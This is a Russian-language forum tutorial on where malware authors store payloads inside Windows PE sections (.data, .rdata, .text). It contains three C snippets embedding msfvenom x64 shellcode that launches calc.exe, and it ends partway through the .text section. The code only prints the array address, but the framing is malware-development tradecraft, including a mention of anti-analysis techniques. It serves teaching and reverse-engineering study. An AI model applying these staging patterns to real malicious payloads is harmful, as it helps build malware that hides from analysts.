–ò—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å, —Ö–æ—Ä–æ—à–æ –∑–Ω–∞–∫–æ–º—ã–π —Å –æ–±—Ä–∞—Ç–Ω–æ–π –∏–Ω–∂–µ–Ω–µ—Ä–∏–µ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –≤–µ—Ä–æ—è—Ç–Ω–æ, —Å–º–æ–∂–µ—Ç –æ–±–Ω–∞—Ä—É–∂–∏—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, —Å–∏—Å—Ç–µ–º—ã –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —á–∞—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç –∫–æ–ø–∏—é –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ –≤ –æ–±–ª–∞–∫–æ –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ –∞–Ω–∞–ª–∏–∑–∞.<br />
<br />
–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –º–æ–≥—É—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞—Ç—å —Ç–µ—Ö–Ω–∏–∫–∏ –ø—Ä–æ—Ç–∏–≤ –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –∞–Ω–∞–ª–∏–∑–∞, —á—Ç–æ–±—ã —É—Å–ª–æ–∂–Ω–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –æ–±—Ä–∞—Ç–Ω–æ–π –∏–Ω–∂–µ–Ω–µ—Ä–∏–∏. –ö –Ω–µ–∫–æ—Ç–æ—Ä—ã–º —Ç–µ—Ö–Ω–∏–∫–∞–º –æ—Ç–Ω–æ—Å—è—Ç—Å—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –æ—Ç–ª–∞–¥—á–∏–∫–∞ –∏ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏–µ –≤–∏—Ä—Ç—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω–æ–π —Å—Ä–µ–¥—ã.</div>
						

							<h2>–ö—É–¥–∞ –∫–ª–∞—Å—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É ?</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746732311613.png"
		data-src="https://osint42.org/attachments/1746732311613-png.57/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732311613-png.57/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732311613.png"
			title="1746732311613.png"
			width="636" height="479" loading="lazy" />
	</div><br />
<br />
–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ –ø—Ä–µ–¥–ª–∞–≥–∞—é –ø–æ–¥–Ω—è—Ç—å —Ç–µ–º—É, –∫—É–¥–∞ –∏ –∫–∞–∫ –∫–ª–∞—Å—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É, –æ–Ω-–∂–µ Payload.<br />
<br />
–†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –∏–º–µ–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ —Ç–æ–≥–æ, –≥–¥–µ –≤ —Ñ–∞–π–ª–µ PE –º–æ–∂–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É. –í –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –≤—ã–±–æ—Ä–∞ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ –±—É–¥–µ—Ç –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ —Ä–∞–∑–Ω—ã—Ö —Ä–∞–∑–¥–µ–ª–∞—Ö —Ñ–∞–π–ª–∞ PE.<br />
<br />
<b>–ü–æ–ª–µ–∑–Ω—ã–µ –Ω–∞–≥—Ä—É–∑–∫–∏ –º–æ–≥—É—Ç —Ö—Ä–∞–Ω–∏—Ç—å—Å—è –≤ –æ–¥–Ω–æ–º –∏–∑ —Å–ª–µ–¥—É—é—â–∏—Ö —Ä–∞–∑–¥–µ–ª–æ–≤ PE:</b><br />
<br />
.data<br />
.rdata<br />
.text<br />
.rsrc<br />
<br />
<b>–†–∞–∑–¥–µ–ª .data</b><br />
<br />
–†–∞–∑–¥–µ–ª .data —Ñ–∞–π–ª–∞ PE ‚Äî —ç—Ç–æ —Ä–∞–∑–¥–µ–ª –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º—ã, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≥–ª–æ–±–∞–ª—å–Ω—ã–µ –∏ —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ. –≠—Ç–æ—Ç —Ä–∞–∑–¥–µ–ª –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è —á—Ç–µ–Ω–∏—è –∏ –∑–∞–ø–∏—Å–∏, —á—Ç–æ –¥–µ–ª–∞–µ—Ç –µ–≥–æ –ø–æ–¥—Ö–æ–¥—è—â–∏–º –¥–ª—è –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω–æ–π –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∫–æ—Ç–æ—Ä–∞—è —Ç—Ä–µ–±—É–µ—Ç –¥–µ—à–∏—Ñ—Ä–æ–≤–∫–∏ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
–ï—Å–ª–∏ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —è–≤–ª—è–µ—Ç—Å—è –≥–ª–æ–±–∞–ª—å–Ω–æ–π –∏–ª–∏ –ª–æ–∫–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π, –æ–Ω–∞ –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∞ –≤ —Ä–∞–∑–¥–µ–ª–µ .data –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –ø—Ä–∏–º–µ—Ä —Ç–æ–≥–æ, –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ .data.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .data saved payload
unsigned char Data_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Data_RawData var : 0x%p \n&quot;, Data_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ä–∞–±–æ—Ç—ã –≤—ã—à–µ—É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞ –∫–æ–¥–∞ –≤ xdbg.<br />
<br />
–û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø—É–Ω–∫—Ç–æ–≤ –Ω–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏:<br />
<br />
–†–∞–∑–¥–µ–ª .data –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –∞–¥—Ä–µ—Å–∞ 0x00007FF7B7603000.<br />
–ë–∞–∑–æ–≤—ã–π –∞–¥—Ä–µ—Å Data_RawData —Ä–∞–≤–µ–Ω 0x00007FF7B7603040, —á—Ç–æ —è–≤–ª—è–µ—Ç—Å—è —Å–º–µ—â–µ–Ω–∏–µ–º –Ω–∞ 0x40 –æ—Ç —Ä–∞–∑–¥–µ–ª–∞ .data.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732328348.png"
		data-src="https://osint42.org/attachments/1746732328348-png.58/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732328348-png.58/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732328348.png"
			title="1746732328348.png"
			width="975" height="226" loading="lazy" />
	</div><br />
<br />
<b>–†–∞–∑–¥–µ–ª .rdata</b><br />
<br />
–ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ, –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω—ã–µ —Å –∫–≤–∞–ª–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º const, –∑–∞–ø–∏—Å—ã–≤–∞—é—Ç—Å—è –∫–∞–∫ –∫–æ–Ω—Å—Ç–∞–Ω—Ç—ã. –¢–∞–∫–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ —Å—á–∏—Ç–∞—é—Ç—Å—è –¥–∞–Ω–Ω—ã–º–∏ &quot;—Ç–æ–ª—å–∫–æ –¥–ª—è —á—Ç–µ–Ω–∏—è&quot;. –ë—É–∫–≤–∞ &quot;r&quot; –≤ .rdata —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ —ç—Ç–æ, –∏ –ª—é–±–∞—è –ø–æ–ø—ã—Ç–∫–∞ –∏–∑–º–µ–Ω–∏—Ç—å —ç—Ç–∏ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ –Ω–∞—Ä—É—à–µ–Ω–∏—é –¥–æ—Å—Ç—É–ø–∞. –ö—Ä–æ–º–µ —Ç–æ–≥–æ, –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–∞ –∏ –µ–≥–æ –Ω–∞—Å—Ç—Ä–æ–µ–∫, —Ä–∞–∑–¥–µ–ª—ã .data –∏ .rdata –º–æ–≥—É—Ç –±—ã—Ç—å –æ–±—ä–µ–¥–∏–Ω–µ–Ω—ã, –∏–ª–∏ –¥–∞–∂–µ –æ–±—ä–µ–¥–∏–Ω–µ–Ω—ã —Å —Ä–∞–∑–¥–µ–ª–æ–º .text.<br />
<br />
–ü—Ä–∏–≤–µ–¥–µ–Ω–Ω—ã–π –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç –∫–æ–¥–∞ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –ø—Ä–∏–º–µ—Ä —Ç–æ–≥–æ, –∫–∞–∫ –ø–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Ä–∞–∑–¥–µ–ª–µ .rdata. –ö–æ–¥ –ø–æ —Å—É—Ç–∏ –±—É–¥–µ—Ç —Ç–∞–∫–∏–º –∂–µ, –∫–∞–∫ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞, –∑–∞ –∏—Å–∫–ª—é—á–µ–Ω–∏–µ–º —Ç–æ–≥–æ, —á—Ç–æ –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è —Ç–µ–ø–µ—Ä—å –ø—Ä–µ–¥–≤–∞—Ä–µ–Ω–∞ –∫–≤–∞–ª–∏—Ñ–∏–∫–∞—Ç–æ—Ä–æ–º const.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .rdata saved payload
const unsigned char Rdata_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Rdata_RawData var : 0x%p \n&quot;, Rdata_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
–ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –Ω–∏–∂–µ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã dumpbin.exe –Ω–∞ —Ñ–∞–π–ª–µ PE. –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—Ä–µ–¥—ã –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è C++ Visual Studio –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–≥—Ä—É–∑–∏—Ç dumpbin.exe.<br />
<br />
–ö–æ–º–∞–Ω–¥–∞: dumpbin.exe /ALL &lt;binary-file.exe&gt;<br />
<br />
–ü—Ä–æ–∫—Ä—É—Ç–∏—Ç–µ –≤–Ω–∏–∑ –∏ –ø–æ—Å–º–æ—Ç—Ä–∏—Ç–µ –¥–µ—Ç–∞–ª–∏ —Ä–∞–∑–¥–µ–ª–∞ .rdata, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –¥–∞–Ω–Ω—ã–µ, —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ –≤ –∏—Å—Ö–æ–¥–Ω–æ–º –¥–≤–æ–∏—á–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732339823.png"
		data-src="https://osint42.org/attachments/1746732339823-png.59/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732339823-png.59/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732339823.png"
			title="1746732339823.png"
			width="960" height="495" loading="lazy" />
	</div><br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746732346734.png"
		data-src="https://osint42.org/attachments/1746732346734-png.60/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746732346734-png.60/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746732346734.png"
			title="1746732346734.png"
			width="975" height="469" loading="lazy" />
	</div><br />
<br />
<b>–†–∞–∑–¥–µ–ª .text </b><br />
<br />
–í —Ä–∞–∑–¥–µ–ª–µ .text –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –∫–æ–¥ –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
<b>–ü–æ—ç—Ç–æ–º—É </b>–°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –≤ —Ä–∞–∑–¥–µ–ª–µ .text –æ—Ç–ª–∏—á–∞–µ—Ç—Å—è –æ—Ç –∏—Ö —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –≤ —Ä–∞–∑–¥–µ–ª–∞—Ö .data –∏–ª–∏ .rdata.<br />
–ó–¥–µ—Å—å —Ä–µ—á—å –Ω–µ –∏–¥–µ—Ç –ø—Ä–æ—Å—Ç–æ –æ –æ–±—ä—è–≤–ª–µ–Ω–∏–∏ —Å–ª—É—á–∞–π–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π. –ù—É–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—É —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å –µ–µ –≤ —Ä–∞–∑–¥–µ–ª–µ .text, —á—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–º –Ω–∏–∂–µ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;// msfvenom calc shellcode
// msfvenom -p windows/x64/exec CMD=calc.exe -f c
// .text saved payload
#pragma section(&quot;.text&quot;)__declspec(allocate(&quot;.text&quot;)) const unsigned char Text_RawData[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

int main() {

    printf(&quot;[i] Text_RawData var : 0x%p \n&quot;, Text_RawData);
    printf(&quot;[#] Press &lt;Enter&gt; To Quit ...&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
–ó–¥–µ—Å—å –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä—É —É–∫–∞–∑–∞–Ω–æ —Ä–∞–∑–º–µ—Å—Ç–∏—Ç—å –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é Text_rawData –≤ —Ä–∞–∑–¥–µ–ª–µ .text –≤–º–µ—Å—Ç–æ —Ä–∞–∑–¥–µ–ª–∞ .rdata.<b><u> <br />
<br />
